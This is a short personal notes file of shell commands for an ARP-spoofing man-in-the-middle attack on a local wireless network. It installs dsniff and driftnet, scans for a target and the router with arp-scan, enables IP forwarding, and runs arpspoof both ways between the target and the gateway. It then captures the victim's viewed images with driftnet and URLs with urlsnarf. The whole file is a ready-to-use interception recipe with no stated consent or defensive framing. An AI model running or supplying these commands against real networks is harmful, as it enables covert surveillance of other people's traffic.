#09-02-2016 - Man-in-the-middle / spoofing tests

#TOOLS
  apt-get install traceroute 	#if not installed. can be useful to get router ip (traceroute google.fr)
  apt-get install arp-scan	#know your network (or arp by default)
  apt-get install dsniff	#spoof & sniff
  apt-get install driftnet	#

#CORE Man-in-the-middle
  ifconfig -a | grep inet			#know your interface name & ip
  arp-scan --interface=wlan0 --localnet 	#(or arp -a) get target ip & router ip
  #for (( x=1; x <= 254; x++ )); do ping -c 3 192.168.0.$x; done	#...or the hard way :)
  #ping -b -i 5 -c 2 192.168.1.255		#ping broadcast (for ?)
  ping 192.168.1.29				#target ip

  sysctl -w net.ipv4.ip_forward=1		#ensure ip forwarding (otherwise, no browsing for the target)
  arpspoof -i wlan0 -t 192.168.1.29 192.168.1.1	#between target & router
  arpspoof -i wlan0 -t 192.168.1.1 192.168.1.29	#between router & target

  driftnet -i wlan0	#show images
  urlsnarf -i wlan0	#doesn't work :(	

#...to be continued

